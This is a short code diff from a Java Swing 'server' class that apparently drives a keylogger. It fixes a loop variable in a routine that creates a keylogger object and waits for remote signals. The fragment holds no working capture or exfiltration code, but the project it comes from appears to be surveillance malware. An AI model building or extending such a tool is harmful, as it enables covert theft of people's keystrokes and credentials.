@@ -240,7 +240,7 @@ public class server extends javax.swing.JFrame {
     {
         keylogger key =new keylogger();
         boolean flag = true;
-        while (test)
+        while (flag)
         {
             receiveSignal();
             switch (program.signal)
